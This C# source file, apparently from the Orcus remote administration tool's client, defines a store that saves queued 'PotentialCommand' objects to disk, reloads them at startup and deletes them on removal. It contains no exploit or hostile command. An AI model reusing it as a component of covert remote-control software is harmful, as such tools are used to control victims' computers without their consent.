using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Config;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommandManagement
{
    public class DynamicCommandStore
    {
        private readonly Dictionary<PotentialCommand, FileInfo> _files;

        public DynamicCommandStore()
        {
            StoredCommands = new List<PotentialCommand>();
            _files = new Dictionary<PotentialCommand, FileInfo>();
        }

        public object ListLock { get; } = new object();
        public List<PotentialCommand> StoredCommands { get; }

        public void Initialize()
        {
            var directory = new DirectoryInfo(Consts.PotentialCommandsDirectory);
            if (!directory.Exists)
                return;

            foreach (var fileInfo in directory.GetFiles("*.PotentialCommand"))
                TryAddPotentialCommand(fileInfo);
        }

        public void AddStoredCommand(PotentialCommand potentialCommand)
        {
            var serializer = new Serializer(typeof(PotentialCommand));
            var fileInfo =
                new FileInfo(FileExtensions.GetUniqueFileName(Consts.PotentialCommandsDirectory,
                    "PotentialCommand"));

            Directory.CreateDirectory(Consts.PotentialCommandsDirectory);
            File.WriteAllBytes(fileInfo.FullName, serializer.Serialize(potentialCommand));

            lock (ListLock)
            {
                _files.Add(potentialCommand, fileInfo);
                StoredCommands.Add(potentialCommand);
            }
        }

        public void RemoveStoredCommand(PotentialCommand potentialCommand)
        {
            lock (ListLock)
            {
                StoredCommands.Remove(potentialCommand);
                FileInfo fileInfo;
                if (_files.TryGetValue(potentialCommand, out fileInfo))
                {
                    _files.Remove(potentialCommand);
                    try
                    {
                        fileInfo.Delete();
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }
            }
        }

        private void TryAddPotentialCommand(FileInfo fileInfo)
        {
            try
            {
                var serializer = new Serializer(typeof(PotentialCommand));
                var potentialCommand = serializer.Deserialize<PotentialCommand>(File.ReadAllBytes(fileInfo.FullName));
                lock (ListLock)
                {
                    StoredCommands.Add(potentialCommand);
                    _files.Add(potentialCommand, fileInfo);
                }
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}